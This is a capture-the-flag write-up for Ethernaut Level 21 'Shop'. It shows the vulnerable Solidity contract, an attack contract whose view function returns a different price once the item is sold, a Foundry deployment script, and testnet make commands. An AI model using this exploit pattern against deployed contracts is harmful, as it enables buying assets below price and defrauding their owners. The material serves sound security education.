# Level 21 - Shop ⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/21" %}

### Level Setup

{% hint style="info" %}
Сan you get the item from the shop for less than the price asked?

**Things that might help:**

* `Shop` expects to be used from a `Buyer`
* Understanding restrictions of view functions
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/a89c8f7832258655c09fde16e6602c78e5e99dbd/contracts/src/levels/Shop.sol" %}

{% code lineNumbers="true" fullWidth="false" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```
{% endcode %}

### Exploit

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-21

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-21

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Contract" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/41e8352c33605e6e95a29c2bf937f92d53fb45a3/src/Level21.sol" %}

{% code title="src/Level21.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ================================================================
// │                         LEVEL 21 - SHOP                      │
// ================================================================
interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
    function price() external view returns (uint256);
}

contract AttackContract {
    function price() public view returns (uint256) {
        bool isSold = IShop(msg.sender).isSold();
        uint256 askedPrice = IShop(msg.sender).price();
        if (!isSold) {
            return askedPrice;
        } else {
            return 0;
        }
    }

    function buyFromShop(address _shopAddr) public {
        IShop(_shopAddr).buy();
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/41e8352c33605e6e95a29c2bf937f92d53fb45a3/script/Level21.s.sol" %}

{% code title="script/Level21.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {AttackContract} from "src/Level21.sol";

// ================================================================
// │                         LEVEL 21 - SHOP                      │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        vm.startBroadcast();
        AttackContract attackContract = new AttackContract();
        attackContract.buyFromShop(targetContractAddress);
        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

Submit instance... 🥳

### Completion Message

{% hint style="info" %}
Contracts can manipulate data seen by other contracts in any way they want.

It's unsafe to change the state based on external and untrusted contracts logic.
{% endhint %}

### Notes

{% embed url="https://github.com/nvnx7/ethernaut-openzeppelin-hacks/blob/e936301859334383d568a614084917100319205e/level_21_Shop.md" %}
